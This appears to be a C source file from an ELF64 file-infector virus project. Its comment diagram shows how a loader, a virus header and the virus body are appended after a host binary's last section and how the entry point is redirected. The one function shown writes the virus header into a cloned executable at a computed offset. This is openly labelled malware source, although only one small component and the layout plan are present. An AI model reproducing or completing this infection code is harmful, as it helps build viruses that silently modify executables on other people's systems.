#include "virus.h"
#include "errors.h"
#include "utils.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD
**                          |  ...   |
**                          |  ...   |
**             sh_offset -> |--------|
**                      |   |  ...   |
**                      V   |  ...   |
**    offset_in_section -   |>>>>>>>>| entry    - relative_entry_address
**                          |  ...   |          ^
**                          |--------|          |
**                          |  ...   |          |
**                          |  ...   |          |
**   end_of_last_section -> |--------| -  -  -  -- -  -  -  -  -  -
**         @loader_entry -> |@@@@@@@@| |                          |
**                          |@      @| |                          |
**                          |@@@@@@@@| |                          |
**  @virus_header_struct -> |UNICORNS| V                          |
**                @virus -> |~~~~~~~~| - relative_virus_addresss  |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| V                          V
** @_start (placeholder) -> |~~~~~~~~| - virus_size               - payload_size
**                          |  ...   |
**                          |  ...   |
**                          |========|
**                          |  ...   |
**                          .        .
**
** Note that relative_entry_address is in the opposite direction !
*/

bool		setup_virus_header(struct safe_ptr clone_ref,
			size_t end_of_last_section,
			struct virus_header vhdr)
{
	const size_t	payload_off = end_of_last_section;
	const size_t	header_off  = payload_off + vhdr.dist_header_loader;

	void	*constants_location = safe(clone_ref, header_off, sizeof(vhdr));

	if (constants_location == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_CONSTANTS);

	memcpy(constants_location, &vhdr, sizeof(vhdr));

	return true;
}
